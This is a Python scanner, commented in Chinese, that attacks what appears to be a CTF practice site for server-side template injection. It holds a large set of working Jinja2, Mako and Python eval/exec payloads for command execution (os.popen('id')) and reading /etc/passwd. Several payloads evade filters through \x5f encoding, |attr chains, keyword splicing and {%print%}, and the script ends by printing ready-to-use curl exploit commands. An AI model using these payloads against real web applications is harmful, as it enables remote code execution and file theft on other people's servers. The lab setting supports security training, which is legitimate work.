#!/usr/bin/env python3
"""
SSTI 漏洞扫描器 v1.0
目标: http://ssti.ctfstu.uk:1685/
功能: 扫描 Jinja2/Mako/Python eval/exec 漏洞，检测下标、命令执行、文件读取、eval函数等
"""

import requests
import re
import sys
import json
from urllib.parse import urljoin, urlparse, quote
from datetime import datetime

# ========== 配置 ==========
TIMEOUT = 10
VERBOSE = True
TARGET = "http://ssti.ctfstu.uk:1685"


# ========== 辅助函数 ==========
def log(msg, data=None):
    if VERBOSE:
        print("[*] " + str(msg))
        if data:
            text = str(data)
            if len(text) > 400:
                text = text[:400] + "..."
            print("    " + text)


def fetch(url, method="GET", data=None, params=None):
    """发送 HTTP 请求并返回响应"""
    try:
        if method.upper() == "GET":
            r = requests.get(url, params=params, timeout=TIMEOUT)
        else:
            r = requests.post(url, data=data, params=params, timeout=TIMEOUT)
        return r.text, r.status_code
    except Exception as e:
        return "ERROR: " + str(e), 0


def extract_text(html, tag="pre"):
    """从 HTML 中提取标签内容"""
    m = re.search(r'<' + tag + r'[^>]*>(.*?)</' + tag + r'>', html, re.DOTALL)
    if m:
        return m.group(1).strip()
    m = re.search(r'<h[23]>(.*?)</h[23]>', html, re.DOTALL)
    if m:
        return m.group(1).strip()
    return html[:500]


def color(s, code=92):
    return "\033[" + str(code) + "m" + s + "\033[0m"


def green(s):
    return color(s, 92)


def yellow(s):
    return color(s, 93)


def red(s):
    return color(s, 91)


def cyan(s):
    return color(s, 96)


# ========== 路由发现 ==========
def discover_routes():
    """从主页提取所有可测试的路由"""
    print(cyan("=" * 60))
    print("  SSTI 漏洞扫描器")
    print("  目标: " + TARGET)
    print(cyan("=" * 60))

    log("正在发现路由...")
    html, _ = fetch(TARGET)

    routes = {
        "flasklab": [],
        "flaskBasedTests": [],
        "generic_template": []
    }

    # Flask 练习关卡 (Level 1-13)
    for m in re.finditer(r'/flasklab/level/(\d+)', html):
        routes["flasklab"].append(int(m.group(1)))
    routes["flasklab"] = sorted(set(routes["flasklab"]))

    # flaskBasedTests 路径
    for m in re.finditer(r'href="([^"]*flaskBasedTests[^"]*)"', html):
        path = m.group(1)
        name = path.rstrip("/").split("/")[-1]
        if name not in routes["flaskBasedTests"]:
            routes["flaskBasedTests"].append(name)

    # generic_template 路径
    for m in re.finditer(r'href="([^"]*generic_template[^"]*)"', html):
        path = m.group(1)
        name = path.rstrip("/").split("/")[-1]
        if name not in routes["generic_template"]:
            routes["generic_template"].append(name)

    if routes["flasklab"]:
        print("     Flask 练习关卡 (Level " + str(min(routes["flasklab"])) + "-" + str(max(routes["flasklab"])) + "): " + str(len(routes["flasklab"])) + " 个")
    if routes["flaskBasedTests"]:
        print("     Flask 基础演示: " + str(len(routes["flaskBasedTests"])) + " 个")
    if routes["generic_template"]:
        print("     通用模板: " + str(len(routes["generic_template"])) + " 个")

    return routes


# ========== 检测模块 ==========
def check_ssti_basic(url, param_name="name"):
    """检测基础 SSTI 注入"""
    results = []
    payloads = [
        ("Jinja2 乘法", {"name": "{{7*7}}"}, "49"),
        ("Jinja2 config", {"name": "{{config}}"}, "SECRET_KEY"),
        ("Jinja2 class", {"name": "{{''.__class__}}"}, "str"),
        ("Mako 乘法", {"name": "${7*7}"}, "49"),
        ("Python eval", {"name": "__import__('os').system('id')"}, None),
        ("Python exec", {"name": "__import__('os').system('id')"}, None),
    ]

    for name, data, expected in payloads:
        resp, code = fetch(url, "POST", data)
        result = "OK" if (expected and expected in resp) or code == 200 else "NO"
        snippet = extract_text(resp)
        mark = green("PASS") if "OK" in result else red("FAIL")
        print("     " + mark + " " + name.ljust(30) + " => " + snippet[:80])
        results.append({"name": name, "success": "OK" in result, "snippet": snippet[:200]})

    return results


def scan_jinja2_payloads(url, param_name, level=None):
    """扫描 Jinja2 SSTI 注入 payloads"""
    sep = "=" * 50
    label = "Level " + str(level) if level else url.split("/")[-1]
    print("\n  " + sep)
    print("  Scan: " + label)
    print("  " + sep)

    payloads = [
        # --- 基础探测 ---
        ("base: 7*7", "{{7*7}}", "49"),
        ("base: config", "{{config}}", "Config"),
        ("base: self", "{{self}}", "TemplateReference"),

        # --- subclass 链 ---
        ("subclass: class", "{{''.__class__}}", "str"),
        ("subclass: mro[2] chain", "{{''.__class__.__mro__[2].__subclasses__()}}", "type"),

        # --- bypass [] ---
        ("bypass[]: attr+list+last", "{{''|attr('__class__')|attr('__mro__')|list|last|attr('__subclasses__')()}}", "type"),

        # --- bypass _ (\\x5f) ---
        ("bypass_: \\x5f编码", "{{''|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5fmro\\x5f\\x5f')|list|last|attr('\\x5f\\x5fsubclasses\\x5f\\x5f')()}}", "type"),

        # --- bypass . ---
        ("bypass.: []下标", "{{''['__class__']['__mro__'][2]['__subclasses__']()}}", "type"),

        # --- bypass keyword ---
        ("bypassKw: 拼接class", "{{''['__cla''ss__']}}", "str"),
        ("bypassKw: 拼接globals", "{{lipsum['__glo''bals__']}}", "builtins"),

        # --- bypass number ---
        ("bypass#: lipsum length", "{{lipsum|string|length}}", "49"),

        # --- bypass quotes ---
        ("bypass': url_for globals", "{{url_for.__globals__}}", "__builtins__"),

        # --- RCE ---
        ("RCE: os.popen(id)", "{{url_for.__globals__['os'].popen('id').read()}}", "uid"),
        ("File: /etc/passwd", "{{url_for.__globals__['os'].popen('cat /etc/passwd').read()}}", "root"),

        # --- {%print%} bypass {{ ---
        ("{%print%} 7*7", "{%print(7*7)%}", "49"),
        ("{%print%} config", "{%print(config)%}", "Config"),
        ("{%print%} RCE", "{%print(url_for.__globals__['os'].popen('id').read())%}", "uid"),

        # --- {%if%} blind ---
        ("{%if%} blind test", "{%if 1%}a{%endif%}", "correct"),

        # --- |attr+__getitem__ full chain ---
        ("RCE: |attr全链", "{{url_for|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}", "uid"),

        # --- file read via |attr ---
        ("File: |attr链", "{{url_for|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('cat /etc/passwd')|attr('read')()}}", "root"),

        # --- access globals ---
        ("globals: url_for", "{{url_for.__globals__}}", "__builtins__"),
        ("globals: lipsum", "{{lipsum|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}", "__builtins__"),

        # --- blind compare ---
        ("blind: cmd compare", "{%if url_for.__globals__['os'].popen('id').read()%}a{%endif%}", "correct"),
    ]

    results = []
    for desc, payload, expected in payloads:
        try:
            if level:
                resp, _ = fetch(url, "POST", {"code": payload})
            else:
                resp, _ = fetch(url, "POST", {param_name: payload})

            snippet = extract_text(resp)
            success = False
            mark = "X"

            if expected:
                if expected in resp:
                    success = True
                    mark = "OK"
            else:
                if "error" not in resp.lower() and resp.strip():
                    success = True
                    mark = "~"

            icon = green(mark) if success else red(mark)
            print("  " + icon + " " + desc.ljust(35) + " => " + snippet[:100])
            results.append({
                "desc": desc, "payload": payload,
                "success": success, "snippet": snippet[:200]
            })
        except Exception as e:
            print("  " + red("X") + " " + desc.ljust(35) + " => ERROR: " + str(e))

    return results


def scan_mako_payloads(url, param_name="name"):
    """扫描 Mako SSTI 注入"""
    label = url.split("/")[-1]
    print("\n  Scan Mako: " + label)

    payloads = [
        ("Mako: 乘法", "${7*7}", "49"),
        ("Mako: os.popen", "${__import__('os').popen('id').read()}", "uid"),
        ("Mako: system", "${__import__('os').system('id')}", None),
        ("Mako: 读文件", "${__import__('os').popen('cat /etc/passwd').read()}", "root"),
        ("Mako: eval", "${eval('7*7')}", "49"),
    ]

    results = []
    for desc, payload, expected in payloads:
        try:
            resp, _ = fetch(url, "POST", {param_name: payload})
            snippet = extract_text(resp)
            success = expected and expected in resp
            icon = green("OK") if success else red("X")
            print("  " + icon + " " + desc.ljust(35) + " => " + snippet[:80])
            results.append({"desc": desc, "payload": payload, "success": success})
        except Exception as e:
            print("  " + red("X") + " " + desc.ljust(35) + " => ERROR: " + str(e))

    return results


def scan_eval_exec(url, param_name="name"):
    """扫描 Python eval/exec 漏洞"""
    label = url.split("/")[-1]
    print("\n  Scan Python eval/exec: " + label)

    payloads = [
        ("eval: os.system(id)", "__import__('os').system('id')", None),
        ("exec: os.system(id)", "__import__('os').system('id')", None),
        ("eval: 读passwd", "__import__('os').popen('cat /etc/passwd').read()", "root"),
        ("exec: 读passwd", "__import__('os').popen('cat /etc/passwd').read()", "root"),
        ("eval: hostname", "__import__('os').popen('hostname').read()", None),
        ("eval: pwd", "__import__('os').popen('pwd').read()", None),
        ("eval: builtins eval", "__import__('builtins').eval('7*7')", "49"),
    ]

    results = []
    for desc, payload, expected in payloads:
        try:
            resp, _ = fetch(url, "POST", {param_name: payload})
            snippet = extract_text(resp)
            success = expected and expected in resp
            icon = green("OK") if success else red("X")
            print("  " + icon + " " + desc.ljust(35) + " => " + snippet[:80])
            results.append({"desc": desc, "payload": payload, "success": success})
        except Exception as e:
            print("  " + red("X") + " " + desc.ljust(35) + " => ERROR: " + str(e))

    return results


# ========== Flask 练习关卡扫描 ==========
def scan_flask_levels():
    """扫描所有 Flask 练习关卡"""
    print(cyan("=" * 60))
    print("  Flask SSTI 练习关卡扫描")
    print(cyan("=" * 60))

    levels = list(range(1, 14))
    all_results = {}

    for level in levels:
        url = TARGET + "/flasklab/level/" + str(level)
        results = scan_jinja2_payloads(url, "code", level=level)
        all_results[level] = results

    return all_results


# ========== 基础演示扫描 ==========
def scan_basic_demos():
    """扫描所有基础演示"""
    print(cyan("=" * 60))
    print("  Flask 基础演示扫描")
    print(cyan("=" * 60))

    known_routes = {
        "jinja2": "Jinja2 模板",
        "mako": "Mako 模板",
        "mako_filtered": "Mako 过滤",
        "makoWithoutVuln": "Mako 无漏洞",
        "insertedInMiddleCodeText": "Mako 文本插入",
        "insertInMiddleCode": "Mako 拼接插入",
        "resultOfPythonEval": "Python eval 函数",
        "resultFromPythonExec": "Python exec 函数",
        "resultOtherPage": "重定向结果",
        "outputNotAccessible": "无回显输出",
    }

    all_results = {}

    for route, label in known_routes.items():
        url = TARGET + "/flaskBasedTests/" + route + "/"
        print("\n  --- " + label + " (" + route + ") ---")

        # 先获取页面，看参数名
        page_html, code = fetch(url)
        param_name = "name"
        names = re.findall(r'name="(\w+)"', page_html)
        if names:
            param_name = names[0]

        log("    参数名: " + param_name)

        if "Mako" in label:
            results = scan_mako_payloads(url, param_name)
        elif "eval" in label.lower() or "exec" in label.lower():
            results = scan_eval_exec(url, param_name)
        else:
            results = check_ssti_basic(url, param_name)

        all_results[route] = results

    return all_results


# ========== 通用模板扫描 ==========
def scan_generic_templates():
    """扫描通用模板"""
    print(cyan("=" * 60))
    print("  通用模板语法扫描")
    print(cyan("=" * 60))

    known_routes = {
        "double_curly": "Jinja2 {{}}",
        "dollar_curly": "Mako ${}",
        "curly": "未知 {{}}?",
        "less_percentage_equal": "ERB/其他 <%=",
        "hash_curly": "Ruby/Smarty #{}?",
    }

    payloads_to_try = [
        ("Jinja2 {{7*7}}", "{{7*7}}"),
        ("Jinja2 {{config}}", "{{config}}"),
        ("Mako ${7*7}", "${7*7}"),
        ("Smarty {7*7}", "{7*7}"),
        ("ERB <%=7*7%>", "<%=7*7%>"),
        ("Ruby #{7*7}", "#{7*7}"),
        ("Velocity $7*7", "$7*7"),
    ]

    all_results = {}

    for route, label in known_routes.items():
        url = TARGET + "/flaskBasedTests/generic_template/" + route + "/"
        print("\n  --- " + label + " (" + route + ") ---")

        page_html, code = fetch(url)
        param_name = "name"
        names = re.findall(r'name="(\w+)"', page_html)
        if names:
            param_name = names[0]

        results = []
        for desc, payload in payloads_to_try:
            try:
                resp, _ = fetch(url, "POST", {param_name: payload})
                snippet = extract_text(resp)
                success = "49" in resp
                icon = green("OK") if success else "?"
                print("  " + icon + " " + desc.ljust(30) + " => " + snippet[:60])
                results.append({"desc": desc, "payload": payload, "success": success})
            except Exception as e:
                print("  " + red("X") + " " + desc.ljust(30) + " => ERROR: " + str(e))

        all_results[route] = results

    return all_results


# ========== 报告生成 ==========
def generate_report(flask_results, basic_results, template_results):
    """生成统一报告"""
    print(cyan("=" * 60))
    print("  扫描报告")
    print(cyan("=" * 60))

    summary = {
        "target": TARGET,
        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "total_routes": 0,
        "vulnerable_routes": 0,
        "total_payloads": 0,
        "successful_payloads": 0,
        "vulnerable_details": []
    }

    # 统计 Flask 练习
    for level, results in flask_results.items():
        sc = sum(1 for r in results if r["success"])
        total = len(results)
        summary["total_payloads"] += total
        summary["successful_payloads"] += sc
        if sc > 0:
            summary["vulnerable_routes"] += 1
            summary["vulnerable_details"].append({
                "route": "/flasklab/level/" + str(level),
                "successful_payloads": sc,
                "total_payloads": total
            })

    # 统计基础演示
    for route, results in basic_results.items():
        sc = sum(1 for r in results if r["success"])
        total = len(results)
        summary["total_payloads"] += total
        summary["successful_payloads"] += sc
        if sc > 0:
            summary["vulnerable_routes"] += 1
            summary["vulnerable_details"].append({
                "route": "/flaskBasedTests/" + route + "/",
                "successful_payloads": sc,
                "total_payloads": total
            })

    # 统计通用模板
    for route, results in template_results.items():
        sc = sum(1 for r in results if r["success"])
        total = len(results)
        summary["total_payloads"] += total
        summary["successful_payloads"] += sc
        if sc > 0:
            summary["vulnerable_routes"] += 1
            summary["vulnerable_details"].append({
                "route": "/flaskBasedTests/generic_template/" + route + "/",
                "successful_payloads": sc,
                "total_payloads": total
            })

    summary["total_routes"] = len(flask_results) + len(basic_results) + len(template_results)

    # 打印报告
    total = max(summary["total_payloads"], 1)
    ratio = summary["successful_payloads"] / total * 100

    print("")
    print("  " + "=" * 40)
    print("  目标: " + summary["target"])
    print("  时间: " + summary["timestamp"])
    print("  " + "-" * 40)
    print("  扫描路由: " + str(summary["total_routes"]) + " 个")
    print("  发现漏洞: " + str(summary["vulnerable_routes"]) + " 个")
    print("  " + "-" * 40)
    print("  测试 Payload: " + str(summary["total_payloads"]) + " 个")
    print("  成功 Payload: " + str(summary["successful_payloads"]) + " 个")
    print("  成功率: " + "%.1f" % ratio + "%")
    print("  " + "=" * 40)
    print("")

    if summary["vulnerable_details"]:
        print("  漏洞详情:")
        for detail in summary["vulnerable_details"]:
            print("     " + green(detail["route"]) + ": " + str(detail["successful_payloads"]) + "/" + str(detail["total_payloads"]) + " 成功")
            if detail["successful_payloads"] >= 10:
                print("       高危: 存在模板注入漏洞")

    # 保存报告
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    report_file = "ssti_scan_report_" + ts + ".json"
    with open(report_file, "w") as f:
        json.dump(summary, f, indent=2, default=str)
    print("\n  报告已保存: " + report_file)

    return summary


# ========== 主函数 ==========
def main():
    banner = cyan("=" * 56) + "\n"
    banner += "    SSTI 漏洞扫描器 v1.0\n"
    banner += "    目标: http://ssti.ctfstu.uk:1685/\n"
    banner += "    Scan: Jinja2 / Mako / eval / exec\n"
    banner += "    Detect: RCE / 文件读取 / 下标访问\n"
    banner += cyan("=" * 56)
    print(banner)

    try:
        # 1. 发现路由
        routes = discover_routes()

        # 2. 扫描 Flask 练习关卡
        print("\n" + "=" * 60)
        print("  第一阶段: Flask SSTI 练习关卡 (Level 1-13)")
        print("=" * 60)
        flask_results = scan_flask_levels()

        # 3. 扫描基础演示
        print("\n" + "=" * 60)
        print("  第二阶段: Flask 基础演示")
        print("=" * 60)
        basic_results = scan_basic_demos()

        # 4. 扫描通用模板
        print("\n" + "=" * 60)
        print("  第三阶段: 通用模板语法")
        print("=" * 60)
        template_results = scan_generic_templates()

        # 5. 生成报告
        summary = generate_report(flask_results, basic_results, template_results)

        # 6. 输出利用建议
        print("\n" + cyan("=" * 60))
        print("  漏洞利用建议")
        print(cyan("=" * 60))
        print("")
        print("  Jinja2 RCE:")
        expl = "    curl -X POST " + TARGET + "/flasklab/level/1 \\"
        expl += "\n      -d 'code={{url_for.__globals__[\"os\"].popen(\"id\").read()}}'"
        print(expl)

        print("")
        print("  Jinja2 文件读取:")
        expl = "    curl -X POST " + TARGET + "/flasklab/level/1 \\"
        expl += "\n      -d 'code={{url_for.__globals__[\"os\"].popen(\"cat /etc/passwd\").read()}}'"
        print(expl)

        print("")
        print("  bypass [] (Level 4):")
        expl = "    curl -X POST " + TARGET + "/flasklab/level/4 \\"
        expl += "\n      -d 'code={{url_for|attr(\"__globals__\")|attr(\"__getitem__\")(\"os\")|attr(\"popen\")(\"id\")|attr(\"read\")()}}'"
        print(expl)

        print("")
        print("  bypass %%7B%7B (Level 2):")
        expl = "    curl -X POST " + TARGET + "/flasklab/level/2 \\"
        expl += "\n      -d 'code={%25print(url_for.__globals__[\"os\"].popen(\"id\").read())%25}'"
        print(expl)

        print("")
        print("  Mako RCE:")
        expl = "    curl -X POST " + TARGET + "/flaskBasedTests/mako/ \\"
        expl += "\n      -d 'name=${__import__(\"os\").system(\"id\")}'"
        print(expl)

        print("")
        print("  Python eval:")
        expl = "    curl -X POST " + TARGET + "/flaskBasedTests/resultOfPythonEval/ \\"
        expl += "\n      -d 'name=__import__(\"os\").system(\"id\")'"
        print(expl)

        print("")
        print(green("扫描完成!"))
        print("  Report saved")

    except KeyboardInterrupt:
        print("\n" + yellow("扫描被用户中断"))
        sys.exit(0)
    except Exception as e:
        print("\n" + red("扫描出错: " + str(e)))
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
